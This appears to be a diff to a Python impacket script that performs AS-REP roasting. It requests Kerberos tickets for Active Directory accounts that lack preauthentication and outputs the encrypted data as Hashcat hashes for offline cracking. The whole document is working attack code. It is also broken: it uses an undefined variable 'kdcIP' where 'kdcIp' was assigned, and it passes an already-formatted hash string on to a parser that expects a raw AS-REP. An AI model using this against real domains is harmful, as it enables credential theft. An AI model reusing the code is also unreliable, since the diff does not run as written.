@@ -12,15 +12,29 @@ from impacket.krb5.asn1 import AS_REQ, KDCOptions, seq_set, seq_set_iter, AS_REP
 from impacket.krb5.kerberosv5 import sendReceive
 from pyasn1.codec.der import encoder, decoder
 
-def getASREP(username, domain, kdcHost):
-    userPrincipal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+def getTGT(userName, domain_name, kdcHost, requestPAC=True):
+
+    clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
     asReq = AS_REQ()
+
+    domain = domain_name
+    kdcIp = kdcHost
+    serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+    pacRequest = KERB_PA_PAC_REQUEST()
+    pacRequest['include-pac'] = requestPAC
+    encodedPacRequest = encoder.encode(pacRequest)
 
     asReq['pvno'] = 5
     asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
 
-    reqBody = asReq['req-body']
+    asReq['padata'] = noValue
+    asReq['padata'][0] = noValue
+    asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+    asReq['padata'][0]['padata-value'] = encodedPacRequest
+
+    reqBody = seq_set(asReq, 'req-body')
 
     opts = list()
     opts.append(constants.KDCOptions.forwardable.value)
@@ -28,25 +42,64 @@ def getASREP(username, domain, kdcHost):
     opts.append(constants.KDCOptions.proxiable.value)
     reqBody['kdc-options'] = constants.encodeFlags(opts)
 
-    seq_set(reqBody, 'cname', userPrincipal.components_to_asn1)
-    reqBody['realm'] = domain.upper()
+    seq_set(reqBody, 'sname', serverName.components_to_asn1)
+    seq_set(reqBody, 'cname', clientName.components_to_asn1)
 
-    seq_set(reqBody, 'sname', Principal('krbtgt/%s' % domain.upper(), type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
+    if domain == '':
+        raise Exception('Empty Domain not allowed in Kerberos')
 
-    now = datetime.datetime.utcnow()
-    reqBody['till'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
-    reqBody['rtime'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
-    reqBody['nonce'] = int(hexlify(os.urandom(4)), 16)
+    reqBody['realm'] = domain
 
-    reqBody['etype'] = [int(constants.EncryptionTypes.rc4_hmac.value),
-                        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
-                        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)]
+    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+    reqBody['till'] = KerberosTime.to_asn1(now)
+    reqBody['rtime'] = KerberosTime.to_asn1(now)
+    reqBody['nonce'] = random.getrandbits(31)
+
+    supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96),
+                        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96),
+                        int(constants.EncryptionTypes.aes128_cts_hmac_sha256_128),
+                        int(constants.EncryptionTypes.aes256_cts_hmac_sha384_192),
+                        int(constants.EncryptionTypes.des3_cbc_sha1_kd),
+                        int(constants.EncryptionTypes.rc4_hmac),
+                        int(constants.EncryptionTypes.camellia128_cts_cmac),
+                        int(constants.EncryptionTypes.camellia256_cts_cmac),
+                        )
+
+    seq_set_iter(reqBody, 'etype', supportedCiphers)
 
     message = encoder.encode(asReq)
 
-    response = sendReceive(message, domain, kdcHost)
+    try:
+        r = sendReceive(message, domain, kdcIP)
+    except KerberosError as e:
+        if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+            raise e
+        else:
+            raise e
 
-    return response
+    # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
+    # 'Do not require Kerberos preauthentication' set
+    try:
+        asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
+    except:
+        # Most of the times we shouldn't be here, is this a TGT?
+        asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+    else:
+        # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
+        raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
+
+  
+    # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
+    # Check what type of encryption is used for the enc-part data
+    # This will inform how the hash output needs to be formatted
+    if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
+        return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
+                                             hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
+                                             hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
+    else:
+        return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
+                                              hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
+                                              hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
 
 def parseASREPHash(response, username, domain):
     asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
@@ -91,7 +144,7 @@ if __name__ == '__main__':
 
     try:
         logging.info('Requesting AS-REP for user: %s' % username)
-        response = getASREP(username, domain, dc_ip)
+        response = getTGT(username, domain, dc_ip)
 
         hash_str = parseASREPHash(response, username, domain)
         if hash_str:
